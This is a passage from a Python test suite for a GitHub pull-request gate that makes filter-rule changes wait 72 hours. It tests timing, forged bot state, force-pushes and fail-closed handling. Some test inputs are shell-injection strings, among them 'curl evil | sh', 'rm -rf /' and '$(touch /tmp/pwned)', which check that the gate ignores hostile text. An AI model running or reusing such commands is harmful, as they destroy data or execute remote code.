"""Tests for the BareFilter waiting-period gate. Run: python3 -m unittest discover -s .github/barefilter-gate

Time is a controlled clock: nothing waits. The fake API records what the gate
writes, so multi-run scenarios (state kept in the bot's comment) are realistic.
"""
import json
import os
import re
import sys
import threading
import unittest
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gate  # noqa: E402

CFG = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")))
PATH = CFG["path"]
OWNER = CFG["owners"][0]                       # whoever config.json names; tests must not hard-code a login
STRANGER = "someone-else"
REPO = "o/r"
N = 7
T0 = datetime(2026, 11, 10, 10, 0, 0, tzinfo=timezone.utc)
RULE_ADD = "@@ -1,2 +1,3 @@\n ! c\n+reddit.com##div.x\n"
RULE_DEL = "@@ -1,3 +1,2 @@\n ! c\n-reddit.com##div.x\n"
RULE_WS = "@@ -3 +3 @@\n-reddit.com##div.a\n+reddit.com##div.a \n"
RULE_SEL = "@@ -3 +3 @@\n-reddit.com##div.a\n+reddit.com##div.b\n"
RULE_EXC = "@@ -4,0 +5 @@\n+reddit.com#@#div.a\n"
RULE_MOVE = "@@ -2,0 +3 @@\n+reddit.com##div.a\n@@ -9 +10,0 @@\n-reddit.com##div.a\n"
COMMENT = "@@ -1 +1 @@\n-! old\n+! new\n"
BLANKS = "@@ -3,0 +4,2 @@\n+\n+\n"


def iso(t):
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def at(hours=0, minutes=0, seconds=0):
    return T0 + timedelta(hours=hours, minutes=minutes, seconds=seconds)


class FakeAPI:
    """Just enough of GitHub for the gate. Writes are recorded and visible to later runs."""

    def __init__(self):
        self.t = at()
        self.pr = {"number": N, "state": "open", "draft": False, "created_at": iso(at()),
                   "title": "plain", "labels": [], "head": {"sha": ""}, "commits": 0}
        self.commits = []          # list of shas, oldest first
        self.files = {}            # sha -> list of file dicts
        self.pr_files = []
        self.timeline = []
        self.comments = []
        self.checks = []
        self.open_prs = [N]
        self.fail_on = None
        self.fail_post_on = None
        self.siblings = []
        self.next_id = 100
        self.sha_counter = 0

    # scenario builders
    def now(self):
        return self.t

    def sha(self):
        self.sha_counter += 1
        return "%040x" % self.sha_counter

    def push(self, *files, **extra):
        sha = self.sha()
        self.commits.append(sha)
        self.files[sha] = list(files)
        self.pr["head"]["sha"] = sha
        self.pr["commits"] = len(self.commits)
        return sha

    def rule_commit(self, patch=RULE_ADD):
        return self.push({"filename": PATH, "status": "modified", "patch": patch})

    def doc_commit(self):
        return self.push({"filename": "filters/CONTRIBUTING.md", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b\n"})

    def event(self, kind, when, actor=OWNER, label=None, **extra):
        e = {"event": kind, "created_at": iso(when), "actor": {"login": actor, "type": "User"}}
        if label:
            e["label"] = {"name": label}
        e.update(extra)
        self.timeline.append(e)

    def label(self, name, when, actor=OWNER):
        self.event("labeled", when, actor, label=name)
        self.pr["labels"].append({"name": name})

    def unlabel(self, name, when, actor=OWNER):
        self.event("unlabeled", when, actor, label=name)
        self.pr["labels"] = [l for l in self.pr["labels"] if l["name"] != name]

    def sync_pr_files(self):
        self.pr_files = [f for s in self.commits for f in self.files[s] if f.get("filename") == PATH]

    # API surface used by the gate
    def get(self, path, **params):
        if self.fail_on and self.fail_on in path:
            raise gate.GateError("boom")
        m = re.fullmatch(r"/repos/o/r/pulls/(\d+)", path)
        if m:
            return json.loads(json.dumps(self.pr))
        m = re.fullmatch(r"/repos/o/r/commits/([0-9a-f]{40})/check-runs", path)
        if m:
            return {"check_runs": [c for c in reversed(self.checks) if c["head_sha"] == m.group(1)]}
        m = re.fullmatch(r"/repos/o/r/commits/([0-9a-f]{40})", path)
        if m:
            files = self.files[m.group(1)]
            per, page = params.get("per_page", 100), params.get("page", 1)
            return {"files": files[(page - 1) * per: page * per]}
        raise AssertionError("unexpected GET " + path)

    def paginate(self, path, **params):
        if self.fail_on and self.fail_on in path:
            raise gate.GateError("boom")
        if re.fullmatch(r"/repos/o/r/pulls/\d+/commits", path):
            return [{"sha": s, "commit": {"author": {"date": "2020-01-01T00:00:00Z"},
                                          "committer": {"date": "2020-01-01T00:00:00Z"},
                                          "message": "$(rm -rf /) \"; echo pwn #"}} for s in self.commits]
        if re.fullmatch(r"/repos/o/r/pulls/\d+/files", path):
            return list(self.pr_files)
        if re.fullmatch(r"/repos/o/r/issues/\d+/timeline", path):
            return list(self.timeline)
        if re.fullmatch(r"/repos/o/r/issues/\d+/comments", path):
            return [dict(c) for c in self.comments]
        if re.fullmatch(r"/repos/o/r/commits/[0-9a-f]{40}/pulls", path):
            return list(self.siblings)
        if path == "/repos/o/r/pulls":
            return [{"number": n} for n in self.open_prs]
        raise AssertionError("unexpected paginate " + path)

    def post(self, path, body):
        if self.fail_post_on and self.fail_post_on in path:
            raise gate.GateError("write failed")
        self.next_id += 1
        if path == "/repos/o/r/check-runs":
            run = dict(body, id=self.next_id, app={"slug": "github-actions"})
            self.checks.append(run)
            return run
        if re.fullmatch(r"/repos/o/r/issues/\d+/comments", path):
            self.comments.append({"id": self.next_id, "body": body["body"], "created_at": iso(self.t),
                                  "user": {"login": gate.BOT_LOGIN, "type": "Bot"}})
            return self.comments[-1]
        raise AssertionError("unexpected POST " + path)

    def patch(self, path, body):
        m = re.fullmatch(r"/repos/o/r/check-runs/(\d+)", path)
        if m:
            for c in self.checks:
                if c["id"] == int(m.group(1)):
                    c.update(body)
            return None
        m = re.fullmatch(r"/repos/o/r/issues/comments/(\d+)", path)
        if m:
            for c in self.comments:
                if c["id"] == int(m.group(1)):
                    c["body"] = body["body"]
            return None
        raise AssertionError("unexpected PATCH " + path)


def base_scenario(evidence=True, ready_event=False):
    """A ready PR with one rule commit and the owner's evidence label at 10:05."""
    api = FakeAPI()
    api.rule_commit()
    api.sync_pr_files()
    if evidence:
        api.label(CFG["evidence_label"], at(minutes=5))
    return api


def run(api, when=None):
    if when is not None:
        api.t = when
    g = gate.Gate(api, REPO, CFG)
    g.process(N)
    return api.checks[-1]


def verdict(check):
    return "pending" if check["status"] == "in_progress" else check["conclusion"]


class PatchParsing(unittest.TestCase):
    def test_rule_lines(self):
        self.assertEqual(gate.patch_rule_lines(RULE_ADD), (1, 0))
        self.assertEqual(gate.patch_rule_lines(RULE_DEL), (0, 1))
        self.assertEqual(gate.patch_rule_lines(RULE_WS), (1, 1))
        self.assertEqual(gate.patch_rule_lines(RULE_MOVE), (1, 1))
        self.assertEqual(gate.patch_rule_lines(RULE_EXC), (1, 0))

    def test_exempt_lines(self):
        self.assertEqual(gate.patch_rule_lines(COMMENT), (0, 0))
        self.assertEqual(gate.patch_rule_lines(BLANKS), (0, 0))
        self.assertEqual(gate.patch_rule_lines("+  \r\n+\t\n-\n"), (0, 0))
        self.assertEqual(gate.patch_rule_lines("@@ -1 +1 @@\n-! a\n\\ No newline at end of file\n+! b\n"), (0, 0))

    def test_tricky_content_counts_as_rule(self):
        # an indented "!" is not a comment; "+++"/"---" are ordinary content here
        self.assertEqual(gate.patch_rule_lines("+ ! x\n"), (1, 0))
        self.assertEqual(gate.patch_rule_lines("+++x\n---y\n"), (1, 1))

    def test_classify(self):
        f = lambda **kw: dict({"filename": PATH, "status": "modified"}, **kw)
        self.assertEqual(gate.classify_files([f(patch=COMMENT)], PATH), (True, False))
        self.assertEqual(gate.classify_files([f(patch=RULE_ADD)], PATH), (True, True))
        self.assertEqual(gate.classify_files([f()], PATH), (True, True))                       # no patch: assume worst
        self.assertEqual(gate.classify_files([f(status="renamed", patch=COMMENT)], PATH), (True, True))
        self.assertEqual(gate.classify_files([{"filename": "x", "previous_filename": PATH, "status": "renamed"}], PATH), (True, True))
        self.assertEqual(gate.classify_files([{"filename": "README.md", "patch": RULE_ADD}], PATH), (False, False))


class Timing(unittest.TestCase):
    def test_unrelated_pr_has_no_wait(self):
        api = FakeAPI()
        api.doc_commit()
        c = run(api, at(minutes=1))
        self.assertEqual(verdict(c), "success")
        self.assertIn("no rule waiting period", c["output"]["summary"])
        self.assertEqual(api.comments, [])                           # unrelated PRs are not commented on

    def test_draft_does_not_start_the_clock(self):
        api = base_scenario()
        api.pr["draft"] = True
        c = run(api, at(hours=100))
        self.assertEqual(verdict(c), "pending")
        self.assertEqual(c["output"]["title"], "Draft")

    def test_needs_owner_evidence_label(self):
        api = base_scenario(evidence=False)
        c = run(api, at(hours=500))
        self.assertEqual(verdict(c), "pending")
        self.assertEqual(c["output"]["title"], "Waiting for evidence")

    def test_label_from_non_owner_is_ignored(self):
        api = base_scenario(evidence=False)
        api.label(CFG["evidence_label"], at(minutes=5), actor="someone-else")
        self.assertEqual(run(api, at(hours=500))["output"]["title"], "Waiting for evidence")

    def test_boundary_is_exact(self):
        api = base_scenario()
        run(api, at(minutes=10))                                   # rule commit first seen 10:10
        deadline = at(minutes=10, hours=72)
        self.assertEqual(verdict(run(api, deadline - timedelta(seconds=1))), "pending")
        self.assertEqual(verdict(run(api, deadline)), "success")

    def test_fractional_second_clock_rounds_up(self):
        api = base_scenario()
        api.t = at(minutes=10).replace(microsecond=400000)
        run(api)
        state = json.loads(gate.STATE_RE.search(api.comments[0]["body"]).group(1))
        self.assertEqual(list(state["commits"].values())[0][0], iso(at(minutes=10, seconds=1)))

    def test_comment_only_edit_does_not_reset(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.push({"filename": PATH, "status": "modified", "patch": COMMENT}); api.sync_pr_files()
        c = run(api, at(hours=40))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("2026-11-13 10:10 UTC", c["output"]["summary"])      # still the original deadline
        self.assertEqual(verdict(run(api, at(minutes=10, hours=72))), "success")

    def test_blank_line_and_doc_edits_do_not_reset(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.push({"filename": PATH, "status": "modified", "patch": BLANKS}); api.sync_pr_files()
        api.doc_commit()
        self.assertEqual(verdict(run(api, at(minutes=10, hours=72))), "success")

    def test_any_rule_line_edit_restarts(self):
        for name, patch in (("addition", RULE_ADD), ("removal", RULE_DEL), ("whitespace", RULE_WS),
                            ("selector", RULE_SEL), ("exception", RULE_EXC), ("move", RULE_MOVE)):
            with self.subTest(name):
                api = base_scenario()
                run(api, at(minutes=10))
                api.push({"filename": PATH, "status": "modified", "patch": patch}); api.sync_pr_files()
                c = run(api, at(hours=50))                         # edit first seen at 50h
                self.assertEqual(verdict(c), "pending")
                self.assertEqual(verdict(run(api, at(hours=50) + timedelta(hours=72) - timedelta(seconds=1))), "pending")
                self.assertEqual(verdict(run(api, at(hours=50) + timedelta(hours=72))), "success")

    def test_backdated_commit_gets_no_credit(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.rule_commit(RULE_SEL); api.sync_pr_files()           # the fake reports its dates as 2020
        c = run(api, at(hours=60))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("rule edit in", c["output"]["summary"])
        self.assertIn(human_str(at(hours=60)), c["output"]["summary"])

    def test_edit_then_revert_restarts_and_stays_relevant(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.rule_commit(RULE_SEL)
        api.rule_commit("@@ -3 +3 @@\n-reddit.com##div.b\n+reddit.com##div.a\n")
        api.pr_files = []                                           # net change against base is now empty
        c = run(api, at(hours=30))
        self.assertEqual(verdict(c), "pending")                    # not "not applicable"
        self.assertEqual(verdict(run(api, at(hours=30) + timedelta(hours=72))), "success")

    def test_force_push_restarts_and_relevance_is_sticky(self):
        api = base_scenario()
        run(api, at(minutes=10))
        # contributor force-pushes history that no longer touches the rules
        api.commits, api.files = [], {}
        api.doc_commit(); api.pr_files = []
        api.event("head_ref_force_pushed", at(hours=20))
        c = run(api, at(hours=20, minutes=1))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("force-push", c["output"]["summary"])
        self.assertEqual(verdict(run(api, at(hours=20) + timedelta(hours=72))), "success")

    def test_record_holds_only_the_current_commits(self):
        api = base_scenario()
        run(api, at(minutes=10))
        old, old_files = api.commits[0], api.files
        api.commits, api.files = [], {}                             # force-push to a new history
        api.doc_commit(); api.pr_files = []
        api.event("head_ref_force_pushed", at(hours=20))
        self.assertEqual(verdict(run(api, at(hours=20, minutes=1))), "pending")    # still a rule proposal
        state = json.loads(gate.STATE_RE.search(api.comments[0]["body"]).group(1))
        self.assertEqual(list(state["commits"]), api.commits)      # the replaced commit has left the record
        api.commits, api.files = [old], old_files                   # force-push back to the old commit
        api.pr["head"]["sha"] = old
        api.event("head_ref_force_pushed", at(hours=40))
        run(api, at(hours=40, minutes=1))
        state = json.loads(gate.STATE_RE.search(api.comments[0]["body"]).group(1))
        self.assertEqual(state["commits"], {old: [iso(at(hours=40, minutes=1)), True, True]})   # first seen again

    def test_force_push_before_ready_does_not_count(self):
        api = FakeAPI()
        api.pr["draft"] = True
        api.rule_commit(); api.sync_pr_files()
        api.event("head_ref_force_pushed", at(minutes=2))
        api.event("ready_for_review", at(minutes=30))
        api.pr["draft"] = False
        api.label(CFG["evidence_label"], at(minutes=40))
        c = run(api, at(minutes=41))
        self.assertIn(human_str(at(minutes=41)), c["output"]["summary"])      # rule commit first seen 10:41

    def test_ready_draft_ready_uses_last_ready(self):
        api = FakeAPI()
        api.rule_commit(); api.sync_pr_files()
        api.label(CFG["evidence_label"], at(minutes=5))
        run(api, at(minutes=10))
        api.event("convert_to_draft", at(hours=20)); api.pr["draft"] = True
        self.assertEqual(run(api, at(hours=21))["output"]["title"], "Draft")
        api.event("ready_for_review", at(hours=30)); api.pr["draft"] = False
        c = run(api, at(hours=30, minutes=1))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("marked ready for review", c["output"]["summary"])
        self.assertEqual(verdict(run(api, at(hours=30) + timedelta(hours=72))), "success")

    def test_missed_events_are_charged_to_the_late_observer(self):
        api = base_scenario()                                       # pushed long ago, never observed
        c = run(api, at(hours=100))
        self.assertEqual(verdict(c), "pending")                    # first seen at 100h, so waits until 172h
        self.assertEqual(verdict(run(api, at(hours=172))), "success")

    def test_label_removed_and_restored_restarts(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.unlabel(CFG["evidence_label"], at(hours=10))
        self.assertEqual(run(api, at(hours=11))["output"]["title"], "Waiting for evidence")
        api.label(CFG["evidence_label"], at(hours=12))
        c = run(api, at(hours=13))
        self.assertEqual(verdict(c), "pending")
        self.assertEqual(verdict(run(api, at(hours=12) + timedelta(hours=72))), "success")

    def test_non_owner_cannot_restore_the_label(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.unlabel(CFG["evidence_label"], at(hours=10))
        api.label(CFG["evidence_label"], at(hours=11), actor="someone-else")
        self.assertEqual(run(api, at(hours=500))["output"]["title"], "Waiting for evidence")

    def test_reopen_and_base_change_restart(self):
        for kind in ("reopened", "base_ref_changed"):
            with self.subTest(kind):
                api = base_scenario()
                run(api, at(minutes=10))
                api.event(kind, at(hours=40))
                self.assertEqual(verdict(run(api, at(hours=41))), "pending")
                self.assertEqual(verdict(run(api, at(hours=40) + timedelta(hours=72))), "success")

    def test_breakage_report_pauses(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.pr["labels"].append({"name": CFG["pause_label"]})
        c = run(api, at(hours=500))
        self.assertEqual(verdict(c), "pending")
        self.assertEqual(c["output"]["title"], "Paused")
        api.pr["labels"] = [l for l in api.pr["labels"] if l["name"] != CFG["pause_label"]]
        self.assertEqual(verdict(run(api, at(hours=501))), "success")


def human_str(t):
    return gate.human(t)


class Heads(unittest.TestCase):
    def test_success_is_tied_to_the_exact_head(self):
        api = base_scenario()
        run(api, at(minutes=10))
        a = api.pr["head"]["sha"]
        self.assertEqual(verdict(run(api, at(hours=80))), "success")
        # a new rule edit arrives; the old success must not cover it
        api.rule_commit(RULE_SEL); api.sync_pr_files()
        b = api.pr["head"]["sha"]
        c = run(api, at(hours=81))
        self.assertEqual((c["head_sha"], verdict(c)), (b, "pending"))
        shas = {(x["head_sha"], verdict(x)) for x in api.checks}
        self.assertIn((a, "success"), shas)
        self.assertNotIn((b, "success"), shas)

    def test_head_moving_during_evaluation_publishes_nothing(self):
        api = base_scenario()
        g = gate.Gate(api, REPO, CFG)
        api.t = at(minutes=10)
        result, state, state_id, comments, pr = g.evaluate(N)
        api.pr["head"]["sha"] = "f" * 40                           # a push lands before we publish
        message = g.publish(N, result, state, state_id, comments, pr, result)
        self.assertIn("changed during evaluation", message)
        self.assertEqual(api.checks, [])


class FailClosed(unittest.TestCase):
    def failing(self, api):
        g = gate.Gate(api, REPO, CFG)
        with self.assertRaises(gate.GateError):
            g.process(N)
        return api.checks[-1]

    def test_api_error_posts_failure(self):
        api = base_scenario()
        api.fail_on = "/timeline"
        c = self.failing(api)
        self.assertEqual(c["conclusion"], "failure")

    def test_too_many_commits(self):
        api = base_scenario()
        api.pr["commits"] = 251
        self.assertEqual(self.failing(api)["conclusion"], "failure")

    def test_commit_list_mismatch(self):
        api = base_scenario()
        api.pr["commits"] = 5
        self.assertEqual(self.failing(api)["conclusion"], "failure")

    def test_unreadable_time(self):
        api = base_scenario()
        api.timeline.append({"event": "ready_for_review", "created_at": "yesterday"})
        self.assertEqual(self.failing(api)["conclusion"], "failure")

    def test_ready_event_missing_after_draft(self):
        api = base_scenario()
        api.event("convert_to_draft", at(hours=1))                # draft, then not draft, no ready event
        self.assertEqual(self.failing(api)["conclusion"], "failure")

    def test_missing_patch_counts_as_rule_edit(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified"})        # huge diff: GitHub omits the patch
        api.sync_pr_files()
        api.label(CFG["evidence_label"], at(minutes=5))
        c = run(api, at(hours=50))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("rule edit in", c["output"]["summary"])

    def test_commit_file_pagination(self):
        api = FakeAPI()
        many = [{"filename": "docs/f%d.md" % i, "status": "added", "patch": "+x"} for i in range(230)]
        many.insert(215, {"filename": PATH, "status": "modified", "patch": RULE_ADD})    # on page 3
        api.push(*many); api.sync_pr_files()
        api.label(CFG["evidence_label"], at(minutes=5))
        c = run(api, at(hours=10))
        self.assertEqual(verdict(c), "pending")
        self.assertIn("rule edit in", c["output"]["summary"])


class Untrusted(unittest.TestCase):
    def test_hostile_text_has_no_effect(self):
        api = base_scenario()
        api.pr["title"] = "$(curl evil | sh); `id`; \"; rm -rf / #"
        api.pr["labels"].append({"name": "$(touch /tmp/pwned)"})
        api.comments.append({"id": 1, "body": "$(echo hi) /approve", "created_at": iso(at(minutes=1)),
                             "user": {"login": "x; echo pwn", "type": "User"}})
        c = run(api, at(minutes=10))
        self.assertEqual(verdict(c), "pending")
        self.assertNotIn("evil", json.dumps(c))

    def test_forged_state_comment_is_ignored(self):
        api = base_scenario()
        sha = api.commits[0]
        forged = {"v": 1, "relevant": True, "commits": {sha: [iso(at(hours=-500)), True, True]}}
        api.comments.append({"id": 5, "created_at": iso(at(minutes=1)),
                             "body": "<!-- barefilter-gate-state:%s -->" % json.dumps(forged),
                             "user": {"login": "contributor", "type": "User"}})
        api.comments.append({"id": 6, "created_at": iso(at(minutes=1)),
                             "body": "<!-- barefilter-gate-state:%s -->" % json.dumps(forged),
                             "user": {"login": gate.BOT_LOGIN, "type": "User"}})     # right name, wrong type
        c = run(api, at(hours=100))
        self.assertEqual(verdict(c), "pending")                    # backdating did not work

    def test_malformed_state_comment_fails_closed(self):
        api = base_scenario()
        api.comments.append({"id": 5, "created_at": iso(at(minutes=1)),
                             "body": "<!-- barefilter-gate-state:{not json} -->",
                             "user": {"login": gate.BOT_LOGIN, "type": "Bot"}})
        c = run(api, at(hours=100))
        self.assertEqual(verdict(c), "pending")                    # treated as unseen: charged to now

    def test_forged_check_context_does_not_hide_ours(self):
        api = base_scenario()
        api.checks.append({"name": CFG["check_name"], "head_sha": api.pr["head"]["sha"], "status": "completed",
                           "conclusion": "success", "id": 1, "app": {"slug": "some-other-app"},
                           "output": {"summary": "pass"}})
        c = run(api, at(minutes=10))
        self.assertEqual(c["app"]["slug"], "github-actions")
        self.assertEqual(verdict(c), "pending")

    def test_bad_head_sha_rejected(self):
        api = base_scenario()
        api.pr["head"]["sha"] = "main; rm -rf /"
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).evaluate(N)


class Urgent(unittest.TestCase):
    def removal(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified", "patch": RULE_DEL}); api.sync_pr_files()
        return api

    def explain(self, api, when, who=OWNER, body="Rule hides the whole page on m.example; removing it now."):
        api.comments.append({"id": 50, "body": body, "created_at": iso(when), "user": {"login": who, "type": "User"}})

    def test_owner_removal_with_explanation_passes_immediately(self):
        api = self.removal()
        run(api, at(minutes=1))                                     # the gate sees the commit first
        api.label(CFG["urgent_label"], at(minutes=5))
        self.explain(api, at(minutes=6))
        c = run(api, at(minutes=7))
        self.assertEqual(verdict(c), "success")
        self.assertIn("Urgent rollback authorized by @" + OWNER, c["output"]["summary"])

    def test_requires_explanation(self):
        api = self.removal()
        run(api, at(minutes=1))
        api.label(CFG["urgent_label"], at(minutes=5))
        c = run(api, at(minutes=7))
        self.assertNotEqual(verdict(c), "success")
        self.explain(api, at(minutes=8), body="ok")                 # too short to be an explanation
        self.assertNotEqual(verdict(run(api, at(minutes=9))), "success")

    def test_explanation_must_follow_the_label_and_come_from_owner(self):
        api = self.removal()
        self.explain(api, at(minutes=1))
        api.label(CFG["urgent_label"], at(minutes=5))
        self.assertNotEqual(verdict(run(api, at(minutes=7))), "success")
        self.explain(api, at(minutes=8), who="someone-else")
        self.assertNotEqual(verdict(run(api, at(minutes=9))), "success")

    def test_addition_cannot_use_the_exception(self):
        api = base_scenario(evidence=False)                         # adds a rule
        api.label(CFG["urgent_label"], at(minutes=5))
        self.explain(api, at(minutes=6))
        c = run(api, at(hours=100))
        self.assertNotEqual(verdict(c), "success")
        self.assertIn("does not apply", c["output"]["summary"])

    def test_removal_plus_addition_cannot_use_it(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified", "patch": RULE_DEL + RULE_ADD}); api.sync_pr_files()
        api.label(CFG["urgent_label"], at(minutes=5))
        self.explain(api, at(minutes=6))
        self.assertNotEqual(verdict(run(api, at(minutes=7))), "success")

    def test_label_from_non_owner_does_not_count(self):
        api = self.removal()
        api.label(CFG["urgent_label"], at(minutes=5), actor="someone-else")
        self.explain(api, at(minutes=6))
        self.assertNotEqual(verdict(run(api, at(minutes=7))), "success")


class Sweep(unittest.TestCase):
    def test_reevaluates_after_deadline_without_an_event(self):
        api = base_scenario()
        run(api, at(minutes=10))                                    # the event run: pending
        self.assertEqual(verdict(api.checks[-1]), "pending")
        api.t = at(minutes=10, hours=72, seconds=30)                # hourly sweep, no PR event
        self.assertEqual(gate.Gate(api, REPO, CFG).sweep(), 0)
        self.assertEqual(verdict(api.checks[-1]), "success")

    def test_sweep_continues_after_one_failure(self):
        api = base_scenario()
        api.open_prs = [N, N]
        calls = []
        orig = gate.Gate.process
        def flaky(self, number):
            calls.append(number)
            if len(calls) == 1:
                raise gate.GateError("first one fails")
            return orig(self, number)
        gate.Gate.process = flaky
        try:
            self.assertEqual(gate.Gate(api, REPO, CFG).sweep(), 1)
        finally:
            gate.Gate.process = orig
        self.assertEqual(len(calls), 2)

    def test_repeat_runs_do_not_spam(self):
        api = base_scenario()
        for h in range(5):
            run(api, at(minutes=10, hours=h))
        self.assertEqual(len(api.checks), 1)
        self.assertEqual(len(api.comments), 1)


# -------------------------------------------------- the real HTTP client

class Handler(BaseHTTPRequestHandler):
    log = []
    mode = "pages"

    def log_message(self, *a):
        pass

    def do_GET(self):
        import urllib.parse as up
        Handler.log.append((self.path, self.headers.get("Authorization")))
        port = self.server.server_address[1]
        query = up.parse_qs(up.urlparse(self.path).query)
        status, extra, body = 200, [], "[1]"
        if self.path.startswith("/rate_limit"):
            body = "{}"
        elif Handler.mode == "loop":
            extra.append(("Link", '<http://127.0.0.1:%d/loop?page=2>; rel="next"' % port))
        elif Handler.mode == "offsite":
            extra.append(("Link", '<http://evil.invalid/x>; rel="next"'))
        elif Handler.mode == "error":
            status, body = 500, "{}"
        else:
            page = int(query.get("page", ["1"])[0])
            if page < 3:
                extra.append(("Link", '<http://127.0.0.1:%d/list?page=%d>; rel="next", <http://x/>; rel="last"' % (port, page + 1)))
            body = json.dumps([page * 10 + 1, page * 10 + 2])
        data = body.encode()
        self.send_response_only(status)          # no automatic Date header: we set the one under test
        self.send_header("Content-Type", "application/json")
        self.send_header("Date", "Tue, 10 Nov 2026 10:20:30 GMT")
        for k, v in extra:
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


class Client(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = HTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.api = gate.GitHub("tok", "http://127.0.0.1:%d" % cls.server.server_address[1])

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        Handler.mode, Handler.log = "pages", []

    def test_follows_pagination(self):
        self.assertEqual(self.api.paginate("/list"), [11, 12, 21, 22, 31, 32])
        self.assertTrue(all(h == "Bearer tok" for _, h in Handler.log))

    def test_server_clock_comes_from_date_header(self):
        self.assertEqual(self.api.now(), datetime(2026, 11, 10, 10, 20, 30, tzinfo=timezone.utc))

    def test_runaway_pagination_fails_closed(self):
        Handler.mode = "loop"
        with self.assertRaises(gate.GateError):
            self.api.paginate("/loop")

    def test_next_link_off_host_is_refused(self):
        Handler.mode = "offsite"
        with self.assertRaises(gate.GateError):
            self.api.paginate("/x")
        self.assertEqual(len(Handler.log), 1)

    def test_http_error_fails_closed(self):
        Handler.mode = "error"
        with self.assertRaises(gate.GateError):
            self.api.get("/x")



class Review(unittest.TestCase):
    """Regression tests from the critical review of the gate."""

    def bot_comment(self, api, cid, state):
        api.comments.append({"id": cid, "created_at": iso(at()), "user": {"login": gate.BOT_LOGIN, "type": "Bot"},
                             "body": "<!-- barefilter-gate-state:%s -->" % json.dumps(state)})

    # -- comment-only pull requests have no rule wait
    def test_comment_only_pr_has_no_rule_wait(self):
        api = FakeAPI()
        api.push({"filename": PATH, "status": "modified", "patch": COMMENT}); api.sync_pr_files()
        c = run(api, at(minutes=1))
        self.assertEqual((verdict(c), c["output"]["title"]), ("success", "Not applicable"))
        api.push({"filename": PATH, "status": "modified", "patch": BLANKS}); api.sync_pr_files()
        self.assertEqual(verdict(run(api, at(minutes=2))), "success")
        self.assertEqual(api.comments, [])
        # the moment a rule line changes it becomes a rule proposal, and stays one
        api.rule_commit(RULE_ADD); api.sync_pr_files()
        self.assertEqual(verdict(run(api, at(minutes=3))), "pending")
        api.push({"filename": PATH, "status": "modified", "patch": COMMENT}); api.sync_pr_files()
        self.assertEqual(verdict(run(api, at(minutes=4))), "pending")

    def test_comment_only_net_diff_is_not_a_rule_change(self):
        api = FakeAPI()
        api.doc_commit()
        api.pr_files = [{"filename": PATH, "status": "modified", "patch": COMMENT}]
        self.assertEqual(run(api, at(minutes=1))["output"]["title"], "Not applicable")

    # -- state authenticity
    def test_later_bot_lookalike_state_is_ignored(self):
        api = base_scenario()
        run(api, at(minutes=10))                                    # the gate writes its own record first
        api.rule_commit(RULE_SEL); api.sync_pr_files()
        x = api.pr["head"]["sha"]
        forged = {sha: [iso(at(hours=-500)), True, True] for sha in api.commits}      # every commit "seen" long ago
        self.bot_comment(api, 900, {"v": 1, "relevant": True, "commits": forged})
        c = run(api, at(hours=80))                                  # honoured, the forged time would let this pass
        self.assertEqual(verdict(c), "pending")

    def test_bad_state_entries_are_dropped_not_trusted(self):
        api = base_scenario()
        sha = api.commits[0]
        self.bot_comment(api, 5, {"v": 1, "relevant": True, "commits": {
            sha: ["not a time", True, True], "zz": [iso(at()), True, True], "1" * 40: [iso(at()), "yes", True]}})
        c = run(api, at(hours=100))
        self.assertEqual(verdict(c), "pending")                    # unreadable entry: seen now, wait from now

    def test_state_with_a_future_time_fails_closed(self):
        api = base_scenario()
        sha = api.commits[0]
        self.bot_comment(api, 5, {"v": 1, "relevant": True, "commits": {sha: [iso(at(hours=24 * 400)), True, True]}})
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).process(N)
        self.assertEqual(api.checks[-1]["conclusion"], "failure")

    def test_timeline_order_gives_a_floor_for_forged_times(self):
        api = base_scenario()
        run(api, at(minutes=10))
        api.event("labeled", at(hours=30), label="some-label")
        api.rule_commit(RULE_SEL); api.sync_pr_files()
        b = api.pr["head"]["sha"]
        api.timeline.append({"event": "committed", "sha": b})       # arrived after the hour-30 event
        state = json.loads(gate.STATE_RE.search(api.comments[0]["body"]).group(1))
        state["commits"][b] = [iso(at(minutes=10)), True, True]     # a forged, much earlier sighting
        api.comments[0]["body"] = "<!-- barefilter-gate-state:%s -->" % json.dumps(state)
        self.assertEqual(verdict(run(api, at(hours=90))), "pending")   # floor: hour 30, so it waits until hour 102
        self.assertEqual(verdict(run(api, at(hours=30) + timedelta(hours=72))), "success")

    def test_event_time_in_the_future_fails_closed(self):
        api = base_scenario()
        api.event("labeled", at(hours=24 * 400), label="some-label")
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).process(N)

    # -- truncated or capped diffs
    def test_commit_with_3000_files_fails_closed(self):
        api = FakeAPI()
        api.push(*[{"filename": "docs/f%d.md" % i, "status": "added", "patch": "+x"} for i in range(3000)])
        with self.assertRaises(gate.GateError):
            gate.Gate(api, REPO, CFG).process(N)

    def test_pull_request_with_3000_files_fails_closed(self):
        api = base_scenario()
        api.pr_files = [{"filename": "docs/f%d.md" % i, "status": "added", "patch": "+x"} for i in range(3000)]
        with self.assertRaises(gate.GateError):
